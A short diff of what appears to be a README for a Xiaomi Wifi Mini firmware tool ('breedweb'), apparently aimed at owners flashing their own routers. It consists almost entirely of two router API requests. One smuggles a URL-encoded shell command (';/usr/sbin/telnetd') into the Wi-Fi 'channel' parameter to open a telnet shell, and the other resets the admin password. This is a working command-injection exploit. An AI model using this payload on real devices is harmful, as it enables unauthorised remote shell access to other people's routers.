@@ -1,4 +1,4 @@
-# BackwebXiaomiWifiMini
+# breedweb Xiaomi Wifi Mini
 /api/xqnetwork/set_wifi_ap?ssid=whatever&encryption=NONE&enctype=NONE&channel=1%3B%2Fusr%2Fsbin%2Ftelnetd
 
 /api/xqsystem/set_name_password?oldPwd=12345678&newPwd=12345678
